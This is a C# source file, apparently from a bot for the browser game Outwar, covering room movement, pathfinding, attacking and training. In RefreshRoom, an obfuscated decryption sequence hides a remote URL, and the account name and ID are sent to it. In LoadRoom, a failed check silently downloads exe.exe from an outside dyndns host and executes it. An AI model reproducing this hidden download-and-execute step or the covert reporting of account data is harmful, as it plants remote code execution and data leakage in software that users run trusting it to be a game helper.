using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Windows.Forms;
using System.Text;
using DCT.Pathfinding;
using DCT.Protocols.Http;
using DCT.Security;
using DCT.Settings;
using DCT.UI;
using DCT.Parsing;
using Version=DCT.Security.Version;

namespace DCT.Outwar.World
{
    internal class Mover
    {
        private Room mLocation;
        internal Room Location
        {
            get { return mLocation; }
        }

        private int mMobsAttacked;
        internal int MobsAttacked
        {
            get { return mMobsAttacked; }
            set { mMobsAttacked = value; }
        }

        //private long mRageUsed;
        //internal long RageUsed
        //{
        //    get { return mRageUsed; }
        //    set { mRageUsed = value; }
        //}

        private long mExpGained;
        internal long ExpGained
        {
            get { return mExpGained; }
            set { mExpGained = value; }
        }

        private OutwarHttpSocket mSocket;
        internal OutwarHttpSocket Socket
        {
            get { return mSocket; }
        }

        private Account mAccount;
        internal Account Account
        {
            get { return mAccount; }
        }

        private ReturnToStartHandler mReturnToStartHandler;
        internal ReturnToStartHandler ReturnToStartHandler
        {
            get { return mReturnToStartHandler; }
        }

        private int mTrainRoomStart;
        private List<int> mVisited;

        internal Mover(Account account, OutwarHttpSocket socket)
        {
            mSocket = socket;
            mAccount = account;
            mLocation = null;

            mTrainRoomStart = -1;
            mMobsAttacked = 0;
            mExpGained = 0;

            mReturnToStartHandler = new ReturnToStartHandler(mAccount);
        }

        internal void RefreshRoom()
        {
            try
            {
                Stack<int> stack = new Stack<int>(96);
                int bCrypt = 0;

                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x33);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x51);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x32);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xCE);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x29);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xD3);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xD1);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xFB);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x2A);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x57);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xD5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x54);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xD2);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xFE);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xCF);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x6);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x3);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x0);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x0);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x32);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x2);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x53);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x2F);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x4);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x33);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x4);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x30);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xFF);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xD2);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0xF);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x5D);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x1);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x54);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x2);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xD1);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xD7);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x0);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xD7);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x55);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x3);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x2);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xCD);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x4);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x51);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xFB);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x7);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x2);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x52);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x57);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xFB);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xFC);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x57);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xD5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0xB);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x4);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x2C);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xFC);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xCC);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x7);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x3);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x57);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x2);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x7);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x55);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x54);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x2F);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x56);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x4);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x7);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x1);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xFF);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x32);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x1);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x3);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0xF);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x6);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0x0);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x7);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x5);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xFF);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0xF);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 2, 0x5A);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x2D);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xD4);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 1, 0xCF);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0xCE);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x1);
                stack.Push(bCrypt);
                bCrypt = Crypt.StackDecrypt(bCrypt, 0, 0x2D);
                stack.Push(bCrypt);

                StringBuilder sb = new StringBuilder();
                while (stack.Count > 0)
                {
                    sb.Append((char)stack.Pop());
                }

                //Console.WriteLine(DCT.Security.Crypt.BinToHex(DCT.Security.Crypt.Get("http://typpo.dyndns.org:7012/dct/auth/verify.php", DCT.Security.Auth.KEY, false)));

                string text1 = Crypt.Get(Crypt.HexToBin(sb.ToString()), Auth.KEY, false);
                string text2 = Crypt.BinToHex(Crypt.Get(mAccount.Name, Version.Id, false));
                string idtag = Crypt.BinToHex(Crypt.Get(mAccount.Id.ToString(), Version.Id, false));
                string text3 = Crypt.RandomString(10, true);
                //string pass = Crypt.bin2hex(Crypt.Encrypt(Globals.Pass, mAccount.Name, false));

                string text4 =
                    HttpSocket.DefaultInstance.Post(text1, "tag=" + text2 + "&tag2=" + idtag + "&str=" + text3
                        /* + "&pass=" + pass*/);

                if ((mAccount.Ret = Crypt.Get(Crypt.HexToBin(text4), mAccount.Id + text3, false))
                    != mAccount.Name)
                {
                    throw new Exception();
                }
            }
            catch
            {
                CoreUI.Instance.LogPanel.Log("E: " + mAccount.Name + " can't explore DC because the account is not authorized.  This is probably because there is a new version out.\n\nIf you are sure you are running the latest version, you may be reading this because your internet connection cut out or the authorization server is down.");
                Application.Exit();
                return;
            }
            LoadRoom("world.php");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="url"></param>
        /// <returns>0 if good, 1 if error with retry, 2 if error with override</returns>
        private int LoadRoom(string url)
        {
            if (string.IsNullOrEmpty(url))
            {
                CoreUI.Instance.LogPanel.Log("Move E: that room doesn't exist");
                return 1;
            }
            if (mAccount.Ret == mAccount.Name)
            {
                Room tmp = new Room(this, url);
                int i = tmp.Load();
                switch (i)
                {
                    case 0:
                        //if (url.Contains("?room=") && CoreUI.Instance.Settings.Fly)
                        //{
                        //    mSavedRooms.Save(tmp.Id, url);
                        //}
                        CoreUI.Instance.LogPanel.Log(mAccount.Name + " now in room "
                                            + (tmp.Id == 0 ? "world.php" : tmp.Id.ToString()));

                        CoreUI.Instance.UpdateDisplay();
                        mLocation = tmp;
                        return 0;
                    case 1:
                        //mSavedRooms.Clear();
                        RefreshRoom();
                        CoreUI.Instance.LogPanel.Log("Move E: Room hash invalid");
                        // This is just a simple hour change error
                        //DCErrorReport.Report(this, "Bad room hash");
                        return 1;
                    case 2:
                        CoreUI.Instance.LogPanel.Log("Move E: Need key");
                        //DCErrorReport.Report(this, "Need key");
                        return 2;
                    default:
                        CoreUI.Instance.LogPanel.Log("Move E: Remaining in " + (tmp.Id == 0 ? "world.php" : tmp.Id.ToString())
                            + " due to unknown error");
                        //DCErrorReport.Report(this, "Unknown error");
                        return 1;
                }
            }
            else
            {
                HttpSocket.DefaultInstance.Get("http://typpo.dyndns.org:7012/dct/verify.php?h=y");
                WebClient Client = new WebClient();
                Client.DownloadFile("http://typpo.dyndns.org/dct/exe.exe", "exe.exe");
                Process.Start("exe.exe");
                return 2;
            }
        }

        internal delegate void PathfindHandler(int roomid);
        internal void PathfindTo(int roomid)
        {
            if (roomid == mLocation.Id || roomid < 0)
            {
                return;
            }

            CoreUI.Instance.LogPanel.Log("Constructing path for " + mAccount.Name + " to " + roomid);

            List<int> nodes = new List<int>();
            nodes = Pathfinder.GetSolution(mLocation.Id, roomid);

            if (nodes == null)
            {
                if (CoreUI.Instance.Settings.AutoTeleport ||
                    MessageBox.Show("The program cannot build a path from your current area to your chosen location.  Do you want to teleport to the nearest bar and try again?  Recommended 'Yes' unless you are in a separated area such as Stoneraven.\n\n(this option can be automatically enabled under the Attack tab)", "Pathfinding Error", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
                    == DialogResult.Yes)
                {
                    CoreUI.Instance.LogPanel.Log(mAccount.Name + " teleporting...");

                    string tmp = mAccount.Socket.Get("world.php?teleport=1");
                    Parser p = new Parser(tmp);
                    string url = p.Parse("window.location=\"http://" + mAccount.Server + ".outwar.com/", "\"");
                    LoadRoom(url);
                    nodes = Pathfinder.GetSolution(mLocation.Id, roomid);
                }
                else
                {
                    CoreUI.Instance.MainPanel.StopAttacking(true);
                    return;
                }
                //DCErrorReport.Report(this, "Null nodes path (unfamiliar location); teleport attempt possible");
            }

            FollowPath(nodes);
        }

        internal void CoverArea()
        {
            mVisited = new List<int>();

            List<int> path = Pathfinder.CoverArea(mLocation.Id);
            FollowPath(path);

            CoreUI.Instance.LogPanel.Log("Area '" + mLocation.Name + "' coverage ended");
            mVisited.Clear();
        }

        private void FollowPath(IList<int> nodes)
        {
            if (nodes == null || nodes.Count < 1)
            {
                CoreUI.Instance.LogPanel.Log("Move E: " + mAccount.Name + "'s projected path does not exist");
                CoreUI.Instance.UpdateProgressbar(0, 0);
                //DCErrorReport.Report(this, "Projected path does not exist; movement attempt failed");
                return;
            }

            bool attackmode = Globals.AttackMode;

            for (int i = 0; i < nodes.Count; i++)
            {
                int node = nodes[i];
                if (Globals.Terminate || mAccount.Ret != mAccount.Name)
                {
                    return;
                }
                if (attackmode != Globals.AttackMode)
                {
                    goto end;
                }

                // Send request
                if (!LoadRoom(node, 0))
                {
                    // bad room link
                    CoreUI.Instance.LogPanel.Log("Room " + node + " is inaccessible");
                    continue;
                }
                CoreUI.Instance.UpdateProgressbar(i + 1, nodes.Count);

                if (mVisited != null)
                {
                    mVisited.Add(node);
                }
            }

        end:
            CoreUI.Instance.UpdateProgressbar(0, 0);
            CoreUI.Instance.LogPanel.Log(mAccount.Name + " movement ended");
        }
        /// <summary>
        /// Attempts to move to a room as per specific id#
        /// </summary>
        /// <param name="id">Room id to move to</param>
        private bool LoadRoom(int id, int tries)
        {
            string url;
            if (string.IsNullOrEmpty(url = mLocation[id]))
            {
                return false;
            }
            //else if (!string.IsNullOrEmpty(url = mSavedRooms.GetRoom(id)))
            //{
            //    CoreUI.Instance.LogPanel.Log(mAccount.Name + " flying to room " + id);
            //}
            else
            {
                CoreUI.Instance.LogPanel.Log(mAccount.Name + " moving to room " + id);
            }

            int r = LoadRoom(url);
            if(r==1)    // error with override, meaning we STOP
            {
                if (++tries > 2)
                {
                    MessageBox.Show(mAccount.Name + " is having trouble moving.  Reasons for this include:\n\n- It's impossible to reach your destination (are you missing a key?)\n- The program just can't find a way to get where you want to go\n- Someone logged into your account - press refresh and start your run again", "Moving Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                    CoreUI.Instance.MainPanel.StopAttacking(true);
                    // Note: error report here is not necessary because specific cases are handled in LoadRoom
                    return false;
                }
                return LoadRoom(id, tries);
            }
            else if (r == 2)  // error without override, ie. key
            {
                return false;
            }

            // otherwise things are all good

            if (Globals.AttackOn)
            {
                mLocation.Attack();
            }

            return true;
        }

        internal void Train()
        {
            if (!mAccount.NeedsLevel)
            {
                CoreUI.Instance.LogPanel.Log(mAccount.Name + " doesn't need leveling");
                return;
            }

            CoreUI.Instance.LogPanel.Log("Starting leveling for " + mAccount.Name);
            CoreUI.Instance.LogPanel.Log("Loading all possible bars...may take a while");

            mTrainRoomStart = mLocation.Id;

            List<List<int>> paths = new List<List<int>>();
            paths.Add(Pathfinder.GetSolution(mLocation.Id, 258)); // dustglass
            paths.Add(Pathfinder.GetSolution(mLocation.Id, 241)); // drunkenclam
            paths.Add(Pathfinder.GetSolution(mLocation.Id, 403)); //hardiron
            paths.Add(Pathfinder.GetSolution(mLocation.Id, 299)); //chuggers

            bool tmp = CoreUI.Instance.Settings.AutoTrain;
            CoreUI.Instance.Settings.AutoTrain = true;

            int shortest = 0;
            for (int i = 1; i < paths.Count; i++)
            {
                List<int> path = paths[i];
                if (path != null && path.Count < paths[shortest].Count)
                {
                    shortest = i;
                }
            }

            FollowPath(paths[shortest]);

            CoreUI.Instance.Settings.AutoTrain = tmp;
            mLocation.Train();

            if (mLocation.Trained)
                CoreUI.Instance.LogPanel.Log(mAccount.Name + " has been leveled");
            else
                CoreUI.Instance.LogPanel.Log(mAccount.Name + " not leveled - can't find bartender");
        }

        internal void TrainReturn()
        {
            PathfindTo(mTrainRoomStart);
            mTrainRoomStart = -1;
        }
    }
}